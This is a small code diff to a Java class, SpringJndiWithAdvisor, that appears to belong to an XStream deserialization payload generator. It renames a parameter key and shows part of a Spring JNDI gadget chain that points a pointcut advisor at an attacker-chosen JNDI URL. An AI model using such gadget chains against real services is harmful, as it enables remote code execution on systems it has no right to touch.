@@ -31,7 +31,7 @@ public class SpringJndiWithAdvisor extends XStreamPayload<Object> {
 
     @Override
     public Object pack(Object obj) throws Exception {
-        String jndi = bullet.get("jndi");
+        String jndi = bullet.get("jndiURL");
         DefaultBeanFactoryPointcutAdvisor advisor1 = new DefaultBeanFactoryPointcutAdvisor();
         advisor1.setAdviceBeanName(jndi);
         advisor1.setBeanFactory((SimpleJndiBeanFactory)obj);
